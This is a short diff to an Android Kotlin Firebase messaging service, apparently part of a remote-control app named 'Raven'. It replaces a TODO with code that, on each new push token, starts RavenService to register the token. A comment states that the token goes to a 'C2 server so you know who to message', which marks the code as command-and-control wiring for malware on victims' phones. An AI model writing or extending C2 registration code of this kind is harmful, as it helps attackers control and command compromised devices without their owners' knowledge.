@@ -30,7 +30,11 @@ class FCMListenerService : FirebaseMessagingService() {
     }
 
     override fun onNewToken(token: String) {
-        // TODO: Send this token to your C2 server so you know who to message
-        // sendRegistrationToServer(token)
+        // Send this token to your C2 server so you know who to message
+        val serviceIntent = Intent(this, RavenService::class.java).apply {
+            action = "REGISTER_FCM"
+            putExtra("token", token)
+        }
+        ContextCompat.startForegroundService(this, serviceIntent)
     }
 }
